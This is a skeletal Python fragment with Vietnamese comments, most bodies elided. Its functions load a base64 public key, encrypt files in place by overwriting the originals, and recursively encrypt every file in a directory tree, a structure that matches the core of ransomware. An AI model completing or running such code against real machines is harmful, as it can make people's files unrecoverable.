...
# Tải khóa công khai từ chuỗi base64
def load_public_key():
...
# Mã hóa file, ghi đè lên file gốc
def encrypt_file(file_path, public_key):
    ...
    print(f"File '{file_path}' đã được mã hóa và ghi đè lên file gốc.")
...
def encrypt_directory(directory_path, public_key):
    for root, dirs, files in os.walk(directory_path):
        for file in files:
            ...
            print(f"Đang mã hóa file: {file_path}")
